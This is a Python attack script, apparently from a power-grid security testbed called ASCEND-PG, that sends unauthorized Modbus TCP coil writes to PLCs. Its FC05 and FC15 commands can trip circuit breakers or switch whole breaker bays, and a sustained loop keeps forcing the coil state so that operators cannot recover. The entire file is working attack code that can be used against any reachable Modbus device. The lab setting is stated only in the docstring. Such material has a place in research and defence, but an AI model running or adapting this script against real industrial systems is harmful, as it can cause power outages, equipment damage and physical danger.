#!/usr/bin/env python3
"""
ASCEND-PG attacks/cmd_inject_coil.py

Modbus TCP Command Injection — Coil / Actuator Manipulation.
MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message).
Taxonomy Reference: Morris & Gao (2013) Command Injection.

In SCADA / ICS power grid architectures, coils represent binary control outputs
such as circuit breaker trip/close contacts, generator disconnects, cooling pump
relays, and capacitor bank switches. Unlike False Data Injection (FDI / T0836),
which falsifies sensor measurement registers to trick operators or algorithms,
Command Injection issues direct unauthorized actuation commands to physical
switchgear.

This script executes unauthorized coil writes against target PLCs:
  - FC05 (Write Single Coil, 0x05): Forces an individual actuator state (e.g., trip breaker 0).
  - FC15 (Write Multiple Coils, 0x0F): Forces a contiguous bank of actuators simultaneously
    (e.g., tripping an entire substation breaker bay).

Supports both one-shot injections and sustained override loops to prevent local
PLC self-healing or legitimate SCADA operator recovery.

Usage:
    # Single coil write (FC05) — trip breaker at coil address 0:
    python3 attacks/cmd_inject_coil.py --target 10.0.0.1 --address 0 --value True

    # Multiple coil write (FC15) — open 4 consecutive breakers starting at address 0:
    python3 attacks/cmd_inject_coil.py --target 10.0.0.1 --address 0 --value False --count 4

    # Sustained command injection — continuously force coil state for 10 seconds:
    python3 attacks/cmd_inject_coil.py --target 10.0.0.1 --address 0 --value True --sustained --duration 10.0 --interval 1.0

Run this ON THE ATTACKER HOST inside the Mininet topology, e.g.:
    mininet> attacker python3 attacks/cmd_inject_coil.py --target 10.0.0.1 --address 0 --value True
"""

import argparse
import json
import logging
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

MODBUS_PORT = 502

# Shared event log store — repo data/ dir, anchored to this file (attacks/ -> repo root)
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
log = logging.getLogger("cmd_inject_coil")


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def str2bool(v) -> bool:
    """Parse string representations of truthy and falsy values."""
    if isinstance(v, bool):
        return v
    val = str(v).strip().lower()
    if val in ("true", "t", "1", "yes", "y", "on", "close", "closed", "trip", "tripped"):
        return True
    if val in ("false", "f", "0", "no", "n", "off", "open"):
        return False
    raise argparse.ArgumentTypeError(f"Boolean value expected, got '{v}'")


def inject_coils_single(ip: str, port: int, address: int, value: bool,
                        count: int = 1, device_id: int = 1,
                        log_path: Path = DEFAULT_LOG) -> bool:
    """
    One-shot coil command injection.
    Uses FC05 (write_coil) if count == 1, or FC15 (write_coils) if count > 1.
    """
    fc = 5 if count == 1 else 15
    log.info("Connecting to %s:%d to inject coil command (FC%02d, addr=%d, value=%s, count=%d)",
             ip, port, fc, address, value, count)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "coil_inject",
        "status": "started",
        "target": ip,
        "port": port,
        "address": address,
        "value": value,
        "count": count,
        "fc": fc,
        "device_id": device_id,
    })

    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target PLC at %s:%d", ip, port)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "coil_inject",
            "status": "connection_failed",
            "target": ip,
            "port": port,
            "address": address,
            "error": f"Connection refused or timed out to {ip}:{port}",
        })
        return False

    try:
        if count == 1:
            result = client.write_coil(address=address, value=value, device_id=device_id)
        else:
            values = [value] * count
            result = client.write_coils(address=address, values=values, device_id=device_id)

        if result.isError():
            log.error("Coil injection failed on %s:%d (FC%02d, addr=%d): %s",
                      ip, port, fc, address, result)
            log_event(log_path, {
                "stage": "Impair Process Control",
                "technique": "T0855",
                "action": "coil_inject",
                "status": "error",
                "target": ip,
                "port": port,
                "address": address,
                "value": value,
                "count": count,
                "fc": fc,
                "error": str(result),
            })
            return False

        log.info("COIL INJECTION SUCCESS: wrote value=%s to %d coil(s) at addr=%d on %s:%d (FC%02d)",
                 value, count, address, ip, port, fc)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "coil_inject",
            "status": "success",
            "target": ip,
            "port": port,
            "address": address,
            "value": value,
            "count": count,
            "fc": fc,
            "device_id": device_id,
        })
        return True
    except Exception as exc:
        log.error("Exception during coil injection on %s:%d: %s", ip, port, exc)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "coil_inject",
            "status": "exception",
            "target": ip,
            "port": port,
            "address": address,
            "error": str(exc),
        })
        return False
    finally:
        client.close()


def inject_coils_sustained(ip: str, port: int, address: int, value: bool,
                           count: int = 1, interval: float = 1.0,
                           duration: float = 10.0, device_id: int = 1,
                           log_path: Path = DEFAULT_LOG) -> dict:
    """
    Sustained coil command injection: repeatedly writes coil state at
    specified intervals for `duration` seconds. Simulates a persistent attacker
    suppressing operator attempts to re-close or reset field actuators.
    """
    fc = 5 if count == 1 else 15
    log.info("Starting sustained coil injection on %s:%d (addr=%d, val=%s, count=%d, interval=%.1fs, duration=%.1fs)",
             ip, port, address, value, count, interval, duration)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "coil_inject_sustained_start",
        "target": ip,
        "port": port,
        "address": address,
        "value": value,
        "count": count,
        "fc": fc,
        "interval": interval,
        "duration": duration,
        "device_id": device_id,
    })

    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target PLC at %s:%d", ip, port)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "coil_inject_sustained_error",
            "target": ip,
            "error": f"Connection failed to {ip}:{port}",
        })
        return {"writes_sent": 0, "writes_failed": 0, "success": False}

    end_time = time.time() + duration
    writes_sent = 0
    writes_failed = 0

    try:
        while time.time() < end_time:
            if count == 1:
                result = client.write_coil(address=address, value=value, device_id=device_id)
            else:
                values = [value] * count
                result = client.write_coils(address=address, values=values, device_id=device_id)

            if result.isError():
                writes_failed += 1
                log.warning("Mid-attack coil write failed (%s:%d, addr=%d): %s", ip, port, address, result)
            else:
                writes_sent += 1
                log.info("Sustained coil write #%d: addr=%d val=%s (FC%02d) on %s:%d",
                         writes_sent, address, value, fc, ip, port)

            time.sleep(interval)
    finally:
        client.close()

    total_success = (writes_sent > 0 and writes_failed == 0)
    log.info("Sustained coil injection finished: %d succeeded, %d failed over %.1f seconds",
             writes_sent, writes_failed, duration)

    result_summary = {
        "writes_sent": writes_sent,
        "writes_failed": writes_failed,
        "duration": duration,
        "interval": interval,
        "target": ip,
        "address": address,
        "value": value,
        "count": count,
        "success": total_success,
    }

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "coil_inject_sustained_result",
        "target": ip,
        "result": result_summary,
    })

    return result_summary


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Modbus Coil Command Injection (MITRE ICS T0855)"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address (e.g., 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=MODBUS_PORT,
                        help=f"Modbus TCP port (default: {MODBUS_PORT})")
    parser.add_argument("-a", "--address", type=int, default=0,
                        help="Coil address to force write (default: 0)")
    parser.add_argument("-v", "--value", type=str2bool, default=True,
                        help="Coil boolean value (True/False, 1/0, trip/close; default: True)")
    parser.add_argument("-c", "--count", type=int, default=1,
                        help="Number of contiguous coils to write (1 uses FC05, >1 uses FC15; default: 1)")
    parser.add_argument("--sustained", action="store_true",
                        help="Repeat injection repeatedly over duration")
    parser.add_argument("--duration", type=float, default=10.0,
                        help="Total duration in seconds for sustained injection (default: 10.0)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Interval in seconds between writes when sustained (default: 1.0)")
    parser.add_argument("--unit", type=int, default=1,
                        help="Modbus Unit ID / Device ID (default: 1)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help=f"Path to shared JSON log store (default: {DEFAULT_LOG})")

    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    if args.sustained:
        inject_coils_sustained(
            ip=args.target,
            port=args.port,
            address=args.address,
            value=args.value,
            count=args.count,
            interval=args.interval,
            duration=args.duration,
            device_id=args.unit,
            log_path=log_path,
        )
    else:
        inject_coils_single(
            ip=args.target,
            port=args.port,
            address=args.address,
            value=args.value,
            count=args.count,
            device_id=args.unit,
            log_path=log_path,
        )


if __name__ == "__main__":
    main()
